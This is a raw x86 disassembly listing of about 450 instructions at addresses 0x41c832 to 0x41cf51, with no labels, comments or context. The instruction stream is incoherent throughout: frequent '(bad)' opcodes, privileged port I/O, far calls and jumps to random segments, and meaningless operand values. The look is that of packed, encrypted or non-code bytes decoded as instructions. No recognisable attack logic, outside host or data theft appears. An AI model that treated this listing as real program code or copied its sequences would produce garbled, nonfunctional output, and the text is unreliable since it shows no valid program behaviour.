  41c832:	les    ebp,FWORD PTR [ebp+edx*1+0x25]
  41c836:	cmp    al,0x31
  41c838:	dec    ebx
  41c839:	pop    ds
  41c83a:	mov    ebx,0xed971864
  41c83f:	stos   DWORD PTR es:[edi],eax
  41c840:	lods   al,BYTE PTR ds:[esi]
  41c841:	psrlq  mm0,QWORD PTR [esi+ebp*1]
  41c845:	sbb    al,0x2a
  41c847:	cmp    bl,0x84
  41c84a:	jbe    0x41c861
  41c84c:	add    al,0xab
  41c84e:	fdivr  QWORD PTR [edx+0x216923ab]
  41c854:	aad    0x98
  41c856:	pop    ds
  41c857:	jp     0x41c7f5
  41c859:	in     eax,dx
  41c85a:	cmp    al,BYTE PTR [esi-0x52]
  41c85d:	sar    BYTE PTR [eax-0x79],1
  41c860:	fsubp  st(2),st
  41c862:	sti    
  41c863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c864:	adc    BYTE PTR [ebx-0x40f8720a],cl
  41c86a:	push   cs
  41c86b:	(bad)  
  41c86c:	inc    ebx
  41c86d:	jno    0x41c8e7
  41c86f:	jo     0x41c8cf
  41c871:	adc    ch,BYTE PTR [ebx+0x22]
  41c874:	leave  
  41c875:	mov    eax,ds:0xd0917c09
  41c87a:	xchg   esi,eax
  41c87b:	dec    ebp
  41c87c:	mov    bl,0xd8
  41c87e:	aad    0xe
  41c880:	test   BYTE PTR [eax],ch
  41c882:	push   ebp
  41c883:	lgs    esi,FWORD PTR [ebx]
  41c886:	js     0x41c857
  41c888:	repnz adc ebp,DWORD PTR ds:0x643dc066
  41c88f:	mov    eax,ss
  41c891:	popa   
  41c892:	add    BYTE PTR [ebp-0x78],bl
  41c895:	gs ss cwde 
  41c898:	xchg   edx,eax
  41c899:	cmp    cl,BYTE PTR ds:0xe1261d4b
  41c89f:	call   0x25e5:0x84bab7d2
  41c8a6:	add    dl,ch
  41c8a8:	sti    
  41c8a9:	inc    edx
  41c8aa:	mov    al,ds:0x4fdd934c
  41c8af:	(bad)  
  41c8b1:	inc    ebx
  41c8b2:	mov    edi,0xca97bc1a
  41c8b7:	stos   DWORD PTR es:[edi],eax
  41c8b8:	push   esi
  41c8b9:	loopne 0x41c8df
  41c8bb:	call   0xc8dd25df
  41c8c0:	out    dx,al
  41c8c1:	(bad)  
  41c8c2:	sbb    DWORD PTR es:[ecx],edx
  41c8c5:	frstor [edi+0x3c]
  41c8c8:	push   ebx
  41c8c9:	jecxz  0x41c8b7
  41c8cb:	clc    
  41c8cc:	cmp    DWORD PTR [ebx+ecx*8],edx
  41c8cf:	in     al,0x53
  41c8d1:	lock inc ecx
  41c8d3:	adc    eax,0x12dafed0
  41c8d8:	inc    esi
  41c8d9:	push   esp
  41c8da:	jnp    0x41c91c
  41c8dc:	scas   eax,DWORD PTR es:[edi]
  41c8dd:	js     0x41c87a
  41c8df:	fisub  WORD PTR [edi]
  41c8e1:	mov    ch,0x82
  41c8e3:	scas   eax,DWORD PTR es:[edi]
  41c8e4:	mov    ecx,0x62d7ee3e
  41c8e9:	push   edx
  41c8ea:	pop    ebx
  41c8eb:	aam    0x78
  41c8ed:	lods   al,BYTE PTR ds:[esi]
  41c8ee:	int3   
  41c8ef:	and    al,0xb2
  41c8f1:	sahf   
  41c8f2:	mov    ah,0xc0
  41c8f4:	enter  0x46d6,0x34
  41c8f8:	shl    dh,1
  41c8fa:	add    al,0xbe
  41c8fc:	(bad)
  41c8ff:	icebp  
  41c900:	scas   eax,DWORD PTR es:[edi]
  41c901:	repz mov dh,0x0
  41c904:	hlt    
  41c905:	icebp  
  41c906:	cs push ss
  41c908:	clc    
  41c909:	stos   BYTE PTR es:[edi],al
  41c90a:	mov    ah,0x67
  41c90c:	(bad)  
  41c90d:	mov    eax,0x6a1efbad
  41c912:	cmc    
  41c913:	ins    BYTE PTR es:[edi],dx
  41c914:	(bad)  
  41c915:	retf   0x4293
  41c918:	js     0x41c8ea
  41c91a:	and    ebp,DWORD PTR [ecx+0x3f]
  41c91d:	and    BYTE PTR [esi],bh
  41c91f:	xlat   BYTE PTR ds:[ebx]
  41c920:	pop    edx
  41c921:	scas   eax,DWORD PTR es:[edi]
  41c922:	icebp  
  41c923:	jmp    0x297a8783
  41c928:	test   DWORD PTR [eax],esp
  41c92a:	fcomp  DWORD PTR cs:[edx+ebp*8-0x5c6e33e0]
  41c932:	popa   
  41c933:	cmp    DWORD PTR [esi-0x64],ecx
  41c936:	call   0x3999f944
  41c93b:	into   
  41c93c:	clc    
  41c93d:	mov    esp,0x39f15b9c
  41c942:	or     BYTE PTR [eax+0x64c3f5e1],0x10
  41c949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c94a:	(bad)  
  41c94b:	cmp    al,0xaa
  41c94d:	aas    
  41c94e:	enter  0x302,0xd4
  41c952:	jmp    0xc39b:0x5d168af7
  41c959:	mov    ch,0xef
  41c95b:	rcl    BYTE PTR [ebx-0x1c],1
  41c95e:	and    al,BYTE PTR [esi-0x3]
  41c961:	ja     0x41c9cb
  41c963:	and    BYTE PTR [edx-0x3e354d16],bl
  41c969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c96a:	mov    dh,dh
  41c96c:	fwait
  41c96d:	enter  0x326b,0x7d
  41c971:	bound  edx,QWORD PTR [esi]
  41c973:	or     eax,0x678e6f03
  41c978:	fild   DWORD PTR [esi]
  41c97a:	mov    ?,WORD PTR [eax-0x47468038]
  41c980:	rcl    BYTE PTR [edx+0x3218c765],1
  41c986:	mov    dh,0xbf
  41c988:	fmulp  st(4),st
  41c98a:	cld    
  41c98b:	mov    eax,0x48785bbe
  41c990:	(bad)  
  41c991:	fs jle 0x41ca0a
  41c994:	imul   edx,DWORD PTR [ecx+0x2d8ae91f],0xfffffffd
  41c99b:	inc    ebx
  41c99c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c99d:	jne    0x41c945
  41c99f:	dec    esp
  41c9a0:	sub    cl,0xff
  41c9a3:	or     ecx,0xffffffdc
  41c9a6:	repnz pop esi
  41c9a8:	sub    eax,0x3f40184e
  41c9ad:	arpl   ax,bp
  41c9af:	push   esi
  41c9b0:	mov    ds:0xd1fce3ec,al
  41c9b5:	jbe    0x41ca30
  41c9b7:	pop    esi
  41c9b8:	adc    esi,DWORD PTR [edx]
  41c9ba:	pop    ecx
  41c9bb:	dec    DWORD PTR [edx+edi*1+0x6c]
  41c9bf:	sub    ah,BYTE PTR fs:[eax]
  41c9c2:	pop    edi
  41c9c3:	or     BYTE PTR [esi+0xf41221],bl
  41c9c9:	or     edi,eax
  41c9cb:	xchg   al,bh
  41c9cd:	mov    edx,0x279211b
  41c9d2:	xor    al,0xce
  41c9d4:	fs fdiv st,st(2)
  41c9d7:	xchg   ebp,eax
  41c9d8:	ss (bad) 
  41c9da:	sub    DWORD PTR fs:[eax+0x27],ecx
  41c9de:	cmp    edi,DWORD PTR [esi+ebp*1]
  41c9e1:	or     al,0x8a
  41c9e3:	loop   0x41c99b
  41c9e5:	nop
  41c9e6:	call   0x1dde12e1
  41c9eb:	dec    DWORD PTR [ecx-0x482fe2ae]
  41c9f1:	and    BYTE PTR [esi-0x779fdcad],ah
  41c9f7:	or     edx,DWORD PTR [esi]
  41c9f9:	bound  eax,QWORD PTR [eax+edx*8]
  41c9fc:	xchg   DWORD PTR [esi+0x1f],ebx
  41c9ff:	fs call 0x1962:0x6876839d
  41ca07:	ds push edx
  41ca09:	jmp    0x36b1:0xea03b63f
  41ca10:	push   0xad2b2917
  41ca15:	and    al,0xca
  41ca17:	cli    
  41ca18:	push   ebx
  41ca19:	dec    edx
  41ca1a:	(bad)  
  41ca1b:	into   
  41ca1c:	outs   dx,DWORD PTR ds:[esi]
  41ca1d:	inc    ebp
  41ca1e:	mov    DWORD PTR ds:0xc053ab1f,0x55b335a6
  41ca28:	fstp   QWORD PTR [ebp+0x62]
  41ca2b:	add    BYTE PTR [eax-0x20],al
  41ca2e:	(bad)  
  41ca2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca30:	mov    dl,0xd0
  41ca32:	mov    bh,BYTE PTR [edi]
  41ca34:	test   eax,0x25fdaa02
  41ca39:	mov    ebx,fs
  41ca3b:	dec    esi
  41ca3d:	cmp    al,0x96
  41ca3f:	mov    esi,0xc1f0e51b
  41ca44:	rol    BYTE PTR [edx],cl
  41ca46:	jmp    0xaaa7:0x14e3feb3
  41ca4d:	push   edx
  41ca4e:	push   0x5ef48516
  41ca53:	adc    al,0x11
  41ca55:	pop    ebx
  41ca56:	adc    esp,ebp
  41ca58:	inc    esi
  41ca59:	out    dx,eax
  41ca5a:	add    esi,DWORD PTR [eax-0x14]
  41ca5d:	addr16 popa 
  41ca5f:	add    DWORD PTR [ebx],ebp
  41ca61:	push   ebx
  41ca62:	out    dx,al
  41ca63:	int    0xf4
  41ca65:	loop   0x41ca91
  41ca67:	leave  
  41ca68:	(bad)  
  41ca69:	pop    esi
  41ca6a:	stos   BYTE PTR es:[edi],al
  41ca6b:	mov    ebx,0xf9b463b7
  41ca70:	jle    0x41ca22
  41ca72:	ja     0x41ca2d
  41ca74:	(bad)  
  41ca75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca76:	add    DWORD PTR [edi-0x381eca76],eax
  41ca7c:	dec    edi
  41ca7d:	fwait
  41ca7e:	cmp    ch,ah
  41ca80:	jmp    0xd7595b80
  41ca85:	push   ss
  41ca86:	fxch   st(0)
  41ca88:	jg     0x41cae5
  41ca8a:	call   0xe21cfe
  41ca8f:	outs   dx,DWORD PTR fs:[esi]
  41ca91:	xlat   BYTE PTR ds:[ebx]
  41ca92:	and    esp,DWORD PTR [eax-0x41fcf005]
  41ca98:	mov    ds:0xd8dec7bf,al
  41ca9d:	cli    
  41ca9e:	je     0x41cab6
  41caa0:	inc    eax
  41caa1:	(bad)  
  41caa3:	or     dl,cl
  41caa5:	mov    eax,0x28c0948b
  41caaa:	xchg   ebp,eax
  41caab:	sbb    al,0x59
  41caad:	sub    BYTE PTR [esi+0x199c041a],bl
  41cab3:	push   es
  41cab4:	imul   eax,DWORD PTR [edi],0x892da1be
  41caba:	in     al,0x8b
  41cabc:	jno    0x41ca85
  41cabe:	in     al,dx
  41cabf:	sub    al,0x83
  41cac1:	push   0x59
  41cac3:	lods   eax,DWORD PTR ds:[esi]
  41cac4:	sub    BYTE PTR [ebx],bl
  41cac6:	mov    bl,0xcd
  41cac8:	mov    cl,0x3d
  41caca:	fs sub ecx,esp
  41cacd:	or     DWORD PTR [ecx-0x535e2c7],edx
  41cad3:	stos   BYTE PTR es:[edi],al
  41cad4:	aaa    
  41cad5:	ss mov edx,0xf7be0343
  41cadb:	out    0xa1,al
  41cadd:	int    0xd8
  41cadf:	xchg   DWORD PTR [ebx+0x4bbe823],esi
  41cae5:	test   BYTE PTR es:[esi],dl
  41cae8:	loope  0x41cb63
  41caea:	test   eax,0x8ec44aac
  41caef:	adc    edi,eax
  41caf1:	or     BYTE PTR [eax+0x11],0xdd
  41caf5:	stos   DWORD PTR es:[edi],eax
  41caf6:	loope  0x41ca83
  41caf8:	daa    
  41caf9:	xor    eax,DWORD PTR [esp+ebx*8-0x67]
  41cafd:	call   0x57a40928
  41cb02:	sub    DWORD PTR [edi+0x67b2cbcc],0xa3a24024
  41cb0c:	pop    esi
  41cb0d:	or     eax,0x2bc40168
  41cb12:	call   0xd16a:0x34045c7a
  41cb19:	cmp    DWORD PTR [eax],edi
  41cb1b:	add    dl,BYTE PTR [ecx]
  41cb1d:	and    al,0x19
  41cb1f:	pop    esp
  41cb20:	aad    0x79
  41cb22:	lea    ebx,[edi]
  41cb24:	jecxz  0x41cab0
  41cb26:	ins    DWORD PTR es:[edi],dx
  41cb27:	xchg   edx,eax
  41cb28:	mov    dl,0x1b
  41cb2a:	inc    edx
  41cb2b:	add    BYTE PTR [edx-0x723aa490],bh
  41cb31:	mov    ?,WORD PTR [esi+0x1f5a41b9]
  41cb37:	leave  
  41cb38:	mov    edx,0xfa08b089
  41cb3d:	in     eax,0x2b
  41cb3f:	(bad)  
  41cb40:	xchg   ebx,eax
  41cb41:	out    0x9a,al
  41cb43:	sub    cl,ah
  41cb45:	scas   al,BYTE PTR es:[edi]
  41cb46:	push   edx
  41cb47:	call   0xbbaf:0xa67ae2eb
  41cb4e:	repnz fnsave [esi]
  41cb51:	dec    esi
  41cb52:	in     eax,0xbc
  41cb54:	push   ds
  41cb55:	pop    esi
  41cb56:	retf   0xbda3
  41cb59:	call   0x92ef:0xf69f4ec6
  41cb60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb61:	aad    0xd0
  41cb63:	xor    cl,dl
  41cb65:	mov    cl,BYTE PTR [ecx-0x6066150]
  41cb6b:	xchg   edi,eax
  41cb6c:	sbb    al,0x53
  41cb6e:	add    BYTE PTR [ecx],0xfe
  41cb71:	push   0x42eeaa1c
  41cb76:	push   eax
  41cb77:	xor    al,0x41
  41cb79:	out    dx,al
  41cb7a:	mov    edi,0xc9549a5c
  41cb7f:	jb     0x41cb7c
  41cb81:	pop    ebp
  41cb82:	sar    DWORD PTR [ebx+0x18],1
  41cb85:	test   DWORD PTR [eax+edx*1-0x4ffae5e],ecx
  41cb8c:	push   ds
  41cb8d:	sub    al,0xd9
  41cb8f:	call   0x9d2d1ba8
  41cb94:	int    0xb6
  41cb96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb97:	adc    edx,DWORD PTR [esi+0x74]
  41cb9a:	out    dx,eax
  41cb9b:	jb     0x41cc07
  41cb9d:	sti    
  41cb9e:	jle    0x41cb25
  41cba0:	daa    
  41cba1:	stc    
  41cba2:	push   ss
  41cba3:	iret   
  41cba4:	stos   DWORD PTR es:[edi],eax
  41cba5:	push   edi
  41cba6:	retf   
  41cba7:	clc    
  41cba8:	inc    esi
  41cba9:	push   es
  41cbaa:	dec    esp
  41cbab:	aas    
  41cbac:	lahf   
  41cbad:	jecxz  0x41cc0d
  41cbaf:	shr    DWORD PTR [ecx+edi*8+0x7c],0x8b
  41cbb4:	(bad)  
  41cbb5:	mov    eax,ds:0x14c43d4c
  41cbba:	cmp    al,0x4d
  41cbbc:	xor    DWORD PTR [eax+0x7e],0xffffff80
  41cbc0:	mov    ebp,0x21671a0d
  41cbc5:	jmp    0x41cbaf
  41cbc7:	xor    eax,0xcd70f7c4
  41cbcc:	mov    bh,0xf1
  41cbce:	pop    ebx
  41cbcf:	push   ecx
  41cbd0:	in     eax,0xd2
  41cbd2:	frstor [esi-0x7a]
  41cbd5:	sar    BYTE PTR [ebp+0x5073cc98],cl
  41cbdb:	inc    edi
  41cbdc:	cwde   
  41cbdd:	pop    ebp
  41cbde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbdf:	dec    esp
  41cbe0:	mov    al,bh
  41cbe2:	xor    dl,bl
  41cbe4:	lds    edi,FWORD PTR [ebx]
  41cbe6:	sub    eax,0x89332cbf
  41cbeb:	push   ds
  41cbec:	cmp    bl,BYTE PTR [edi]
  41cbee:	lock fiadd WORD PTR [eax]
  41cbf1:	adc    BYTE PTR [edx],cl
  41cbf3:	call   0xcc291e4c
  41cbf8:	fidiv  DWORD PTR [ecx-0x7a25843a]
  41cbfe:	cmp    al,0x7d
  41cc00:	dec    bh
  41cc02:	mov    al,0xb0
  41cc04:	inc    ecx
  41cc05:	dec    edx
  41cc06:	mov    ds:0xf8002fe,al
  41cc0b:	das    
  41cc0c:	rcl    DWORD PTR [ecx-0x21],cl
  41cc0f:	xchg   ecx,eax
  41cc10:	sub    esi,DWORD PTR [ecx+edi*4+0x6]
  41cc14:	sbb    DWORD PTR [eax+0x2],edx
  41cc17:	sahf   
  41cc18:	retf   
  41cc19:	or     al,0x24
  41cc1b:	and    bh,al
  41cc1d:	outs   dx,BYTE PTR ds:[esi]
  41cc1e:	loopne 0x41cc6e
  41cc20:	mov    edi,0xc94b0a26
  41cc25:	(bad)  
  41cc26:	ret    
  41cc27:	fistp  WORD PTR [ebx+0x47559435]
  41cc2d:	fstp   DWORD PTR [esi]
  41cc2f:	pop    edi
  41cc30:	dec    esi
  41cc31:	aam    0xfb
  41cc33:	xor    BYTE PTR [esi],al
  41cc35:	xor    eax,0xf0b77782
  41cc3a:	add    BYTE PTR [ebx-0x19],cl
  41cc3d:	pop    edx
  41cc3e:	sti    
  41cc3f:	jne    0x41cc61
  41cc41:	jb     0x41cc35
  41cc43:	push   esi
  41cc44:	lods   eax,DWORD PTR ds:[esi]
  41cc45:	ins    DWORD PTR es:[edi],dx
  41cc46:	ds xchg esp,eax
  41cc48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc49:	lods   al,BYTE PTR ds:[esi]
  41cc4a:	out    dx,al
  41cc4b:	popf   
  41cc4c:	stos   DWORD PTR es:[edi],eax
  41cc4d:	xlat   BYTE PTR ds:[ebx]
  41cc4e:	add    BYTE PTR [ecx+0x47],ah
  41cc51:	add    ch,BYTE PTR [eax+0xb]
  41cc54:	push   edi
  41cc55:	cmp    DWORD PTR [edx],edi
  41cc57:	inc    ecx
  41cc58:	adc    BYTE PTR [edi-0x7a],al
  41cc5b:	popf   
  41cc5c:	push   cs
  41cc5d:	(bad)  
  41cc5e:	scas   al,BYTE PTR es:[edi]
  41cc5f:	mov    ebp,edi
  41cc61:	adc    bl,BYTE PTR [edx+0x2b]
  41cc64:	(bad)  
  41cc66:	repnz rol BYTE PTR [edi-0x3ec994c7],1
  41cc6d:	test   BYTE PTR [eax],cl
  41cc6f:	loopne 0x41cc66
  41cc71:	adc    DWORD PTR [ebx+0x78],ebp
  41cc74:	mov    ch,0xfe
  41cc76:	dec    edx
  41cc77:	fist   WORD PTR [eax+0x19]
  41cc7a:	stos   BYTE PTR es:[edi],al
  41cc7b:	daa    
  41cc7c:	push   cs
  41cc7d:	push   edx
  41cc7e:	out    0x88,eax
  41cc80:	mov    ebp,0x4a9dbe3b
  41cc85:	stos   DWORD PTR es:[edi],eax
  41cc86:	mov    dh,BYTE PTR [ecx-0xcc48013]
  41cc8c:	aam    0x4d
  41cc8e:	std    
  41cc8f:	mov    bh,0xe4
  41cc91:	adc    DWORD PTR [ecx+0x217a95f8],esp
  41cc97:	mov    ss,WORD PTR [ecx]
  41cc99:	fst    DWORD PTR ds:0x8f9a7203
  41cc9f:	inc    esp
  41cca0:	fst    st(3)
  41cca2:	jmp    0x41cd07
  41cca4:	xor    ebx,DWORD PTR [edx-0x58]
  41cca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cca8:	loope  0x41cc8f
  41ccaa:	jg     0x41cc5c
  41ccac:	dec    esi
  41ccad:	aas    
  41ccae:	mov    ds:0x518d860b,eax
  41ccb3:	add    al,0x95
  41ccb5:	pop    eax
  41ccb6:	int3   
  41ccb7:	push   0xffffff9e
  41ccb9:	es icebp 
  41ccbb:	in     al,dx
  41ccbc:	inc    eax
  41ccbd:	aam    0xa3
  41ccbf:	jmp    0xfc52259a
  41ccc4:	test   al,0x1b
  41ccc6:	push   edx
  41ccc7:	fimul  DWORD PTR [eax+0x69d502ce]
  41cccd:	adc    al,0x9d
  41cccf:	adc    eax,0x49ec671
  41ccd4:	mov    dl,0x23
  41ccd6:	sub    BYTE PTR [eax+eax*2],ah
  41ccd9:	jg     0x41cc92
  41ccdb:	jae    0x41cc69
  41ccdd:	cmc    
  41ccde:	cli    
  41ccdf:	mov    al,ds:0xbd5dbbfc
  41cce4:	push   ebx
  41cce5:	cli    
  41cce6:	xor    cl,0x54
  41cce9:	cld    
  41ccea:	adc    ecx,esp
  41ccec:	add    BYTE PTR [ecx+0xe],bh
  41ccef:	adc    DWORD PTR [edx+ebp*1],0xffffffc2
  41ccf3:	or     cl,bl
  41ccf5:	popf   
  41ccf6:	das    
  41ccf7:	cmp    bh,al
  41ccf9:	(bad)  
  41ccfa:	jbe    0x41cd57
  41ccfc:	int3   
  41ccfd:	xchg   ebp,eax
  41ccfe:	fisttp WORD PTR [edx+0x4f9e6ffb]
  41cd04:	js     0x41ccc8
  41cd06:	in     eax,dx
  41cd07:	mov    eax,ds:0x9982827a
  41cd0c:	sbb    DWORD PTR [esi],0x38
  41cd0f:	push   ebx
  41cd10:	mov    esp,0x93c86172
  41cd15:	ins    BYTE PTR es:[edi],dx
  41cd16:	rcl    DWORD PTR [edi],1
  41cd18:	jp     0x41ccb8
  41cd1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd1b:	and    al,0x28
  41cd1d:	pop    edx
  41cd1e:	jbe    0x41cd38
  41cd20:	and    DWORD PTR [edi],esp
  41cd22:	ror    DWORD PTR [eax-0x5b7f8aad],1
  41cd28:	mov    ebx,0xbc18d58d
  41cd2d:	add    esi,DWORD PTR [eax]
  41cd2f:	bound  ebp,QWORD PTR [esi+0x1621300f]
  41cd35:	dec    ecx
  41cd36:	aad    0x11
  41cd38:	inc    esi
  41cd39:	jns    0x41ccce
  41cd3b:	mov    ebx,0x21167f98
  41cd40:	or     bh,bl
  41cd42:	fst    QWORD PTR ds:0xa3346ba5
  41cd48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd49:	push   0x795f112c
  41cd4e:	popa   
  41cd4f:	jne    0x41cd95
  41cd51:	ds test eax,0x99eff698
  41cd57:	mov    ds:0xf9720cf7,al
  41cd5c:	gs int3 
  41cd5e:	and    al,0xfb
  41cd60:	stos   DWORD PTR es:[edi],eax
  41cd61:	arpl   WORD PTR ds:0xc6bd4096,cx
  41cd67:	sbb    cl,al
  41cd69:	call   0x2e7fc912
  41cd6e:	mul    BYTE PTR [edi]
  41cd70:	push   0xffffffad
  41cd72:	add    cl,ah
  41cd74:	cmp    ebp,edi
  41cd76:	push   esi
  41cd77:	loopne 0x41cdb9
  41cd79:	xchg   edi,edi
  41cd7b:	imul   esi,ebp,0x3
  41cd7e:	adc    edx,ebp
  41cd80:	pushf  
  41cd81:	sub    dl,BYTE PTR [edi]
  41cd83:	bnd jl 0x41cd3e
  41cd86:	sbb    BYTE PTR [esi-0x2b071e76],bh
  41cd8c:	jb     0x41cd83
  41cd8e:	dec    BYTE PTR [esi+0x45]
  41cd91:	fcomp  DWORD PTR [ecx+0x26]
  41cd94:	popa   
  41cd95:	(bad)  
  41cd96:	jns    0x41cdb7
  41cd98:	mov    edx,0x31b07e14
  41cd9d:	stos   DWORD PTR es:[edi],eax
  41cd9e:	mov    esi,0x644ce672
  41cda3:	and    al,0x83
  41cda5:	rcl    DWORD PTR [ecx-0x520fef09],1
  41cdab:	add    eax,0x4be9ffc8
  41cdb0:	std    
  41cdb1:	imul   edx,DWORD PTR [ebx],0x5262c365
  41cdb7:	dec    edx
  41cdb8:	adc    dl,ah
  41cdba:	and    BYTE PTR [ecx-0xd],dl
  41cdbd:	inc    ecx
  41cdbe:	repz cmp cl,ah
  41cdc1:	mov    esi,edx
  41cdc3:	push   0xffffffce
  41cdc5:	mov    ah,0xae
  41cdc7:	enter  0xde52,0xff
  41cdcb:	and    dl,cl
  41cdcd:	popa   
  41cdce:	and    eax,DWORD PTR [ecx]
  41cdd0:	push   ebx
  41cdd1:	jmp    0xd02e:0x4dbd5be
  41cdd8:	(bad)  
  41cdd9:	adc    ch,al
  41cddb:	test   dl,bl
  41cddd:	inc    ebp
  41cdde:	iret   
  41cddf:	cdq    
  41cde0:	rcr    BYTE PTR [edx+0x37],1
  41cde3:	adc    bl,BYTE PTR [ecx-0x8649184]
  41cde9:	pop    ss
  41cdea:	aad    0xa7
  41cdec:	pusha  
  41cded:	jg     0x41cdc0
  41cdef:	mov    cl,0xfc
  41cdf1:	fwait
  41cdf2:	(bad)  
  41cdf3:	rol    DWORD PTR [ebp+0x21d3044],cl
  41cdf9:	jp     0x41ce5b
  41cdfb:	pop    eax
  41cdfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdfd:	push   ss
  41cdfe:	loop   0x41cdfd
  41ce00:	jle    0x41ce53
  41ce02:	xchg   edx,eax
  41ce03:	aam    0x32
  41ce05:	out    dx,eax
  41ce06:	sbb    dh,dh
  41ce08:	xchg   ebx,eax
  41ce09:	outs   dx,DWORD PTR ds:[esi]
  41ce0a:	popa   
  41ce0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce0c:	scas   al,BYTE PTR es:[edi]
  41ce0d:	sub    DWORD PTR [ebx+edx*8-0x63],ebp
  41ce11:	stos   DWORD PTR es:[edi],eax
  41ce12:	push   eax
  41ce13:	stos   DWORD PTR es:[edi],eax
  41ce14:	pushf  
  41ce15:	pop    ds
  41ce16:	fst    st(4)
  41ce18:	push   0xfffffff8
  41ce1a:	inc    edx
  41ce1b:	dec    eax
  41ce1c:	or     esi,ebp
  41ce1e:	and    eax,0xaecbe274
  41ce23:	jp     0x41ce17
  41ce25:	and    bh,cl
  41ce27:	loop   0x41ce1c
  41ce29:	ja     0x41cdff
  41ce2b:	mov    DWORD PTR [eax+0x65],eax
  41ce2e:	pop    ss
  41ce2f:	mov    BYTE PTR [ecx+0x103f9a9e],ch
  41ce35:	int3   
  41ce36:	dec    edi
  41ce37:	xchg   esi,eax
  41ce38:	jo     0x41ce40
  41ce3a:	(bad)  
  41ce3b:	push   edi
  41ce3c:	cmovae esi,DWORD PTR [ebp-0x32]
  41ce40:	das    
  41ce41:	pop    ss
  41ce42:	push   0xffffff87
  41ce44:	jmp    0x842fb31a
  41ce49:	test   al,0x5c
  41ce4b:	sub    ebp,DWORD PTR [edi]
  41ce4d:	jle    0x41ceb8
  41ce4f:	cmp    BYTE PTR [ecx-0x67a06068],bh
  41ce55:	lods   eax,DWORD PTR ss:[esi]
  41ce57:	push   ebp
  41ce58:	inc    eax
  41ce59:	xor    dh,BYTE PTR fs:[ecx-0x4e2379b0]
  41ce60:	mov    al,ds:0x892db075
  41ce65:	dec    eax
  41ce66:	sub    dl,BYTE PTR [edi+ebp*8-0x49]
  41ce6a:	fistp  QWORD PTR [ebp-0x70c5caaf]
  41ce70:	inc    eax
  41ce71:	pop    ebx
  41ce72:	add    dh,bl
  41ce74:	ja     0x41ce8b
  41ce76:	pop    ss
  41ce77:	xchg   edx,eax
  41ce78:	(bad)  [edi]
  41ce7a:	xchg   DWORD PTR [esi-0x2af52ea9],eax
  41ce80:	stos   DWORD PTR es:[edi],eax
  41ce81:	loopne 0x41ce4c
  41ce83:	rcl    DWORD PTR [eax+0x17],cl
  41ce86:	es inc esi
  41ce88:	cmp    DWORD PTR ds:0xad6a10b0,edx
  41ce8e:	enter  0xa60a,0xd3
  41ce92:	enter  0xb020,0x92
  41ce96:	pop    ecx
  41ce97:	sub    ebx,esi
  41ce99:	ret    
  41ce9a:	add    BYTE PTR ds:0x8b0384d1,dl
  41cea0:	pop    esi
  41cea1:	dec    esi
  41cea2:	mov    bl,0x3b
  41cea4:	add    dl,BYTE PTR [ecx+0x14a486f3]
  41ceaa:	or     eax,0xa972d18a
  41ceaf:	pop    edi
  41ceb0:	jne    0x41ce59
  41ceb2:	sub    eax,0x968cae9b
  41ceb7:	xchg   esi,eax
  41ceb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceb9:	imul   edx,DWORD PTR [edx+ecx*1],0xfffffff5
  41cebd:	loope  0x41cf12
  41cebf:	inc    eax
  41cec0:	outs   dx,DWORD PTR ds:[esi]
  41cec1:	jmp    0x67b5d388
  41cec6:	push   es
  41cec7:	inc    esp
  41cec8:	lds    ebx,FWORD PTR [ecx-0x32]
  41cecb:	inc    ebp
  41cecc:	jmp    0x41ce86
  41cece:	adc    DWORD PTR [ecx+0x20f9e82f],esp
  41ced4:	push   cs
  41ced5:	sub    al,0xfd
  41ced7:	jge    0x41ced9
  41ced9:	cmp    eax,0x94fc7f2e
  41cede:	push   edi
  41cedf:	imul   esp,DWORD PTR [edx-0x6c],0xa9b265ea
  41cee6:	mov    ebx,0xd94ba869
  41ceeb:	dec    eax
  41ceec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceed:	mov    WORD PTR ds:0xb45cda06,cs
  41cef3:	cmp    DWORD PTR [eax],ebp
  41cef5:	in     al,dx
  41cef6:	repnz mov BYTE PTR [ebp+0x2ef20b2e],al
  41cefd:	nop
  41cefe:	mov    esi,0xd535adc7
  41cf03:	imul   ecx,DWORD PTR ds:0x7884e27c,0xffffff8f
  41cf0a:	int    0x95
  41cf0c:	mov    al,0x22
  41cf0e:	xor    eax,0x450e25de
  41cf13:	jnp    0x41cf7c
  41cf15:	out    dx,eax
  41cf16:	xchg   edx,eax
  41cf17:	sbb    esp,ebp
  41cf19:	bound  edi,QWORD PTR [edi+0x72]
  41cf1c:	nop
  41cf1d:	adc    dl,al
  41cf1f:	mov    bh,bh
  41cf21:	(bad)  
  41cf23:	pushf  
  41cf24:	js     0x41cecf
  41cf26:	xchg   esp,eax
  41cf27:	aaa    
  41cf28:	rep outs dx,BYTE PTR ds:[esi]
  41cf2a:	sbb    esi,DWORD PTR [ecx-0x2a4453de]
  41cf30:	repz repz jp 0x41cf63
  41cf34:	mov    bh,0x3f
  41cf36:	clc    
  41cf37:	fild   WORD PTR [edi]
  41cf39:	test   ecx,esp
  41cf3b:	add    DWORD PTR [edi],edx
  41cf3d:	adc    bl,dl
  41cf3f:	dec    edx
  41cf40:	fidivr WORD PTR [eax+0x26]
  41cf43:	add    al,0xa9
  41cf45:	pop    ebp
  41cf46:	push   0x50
  41cf48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf49:	xchg   DWORD PTR [edi+ecx*4-0x2],edx
  41cf4d:	iret   
  41cf4e:	in     eax,0x5f
  41cf50:	ret    
  41cf51:	out    0x51,eax
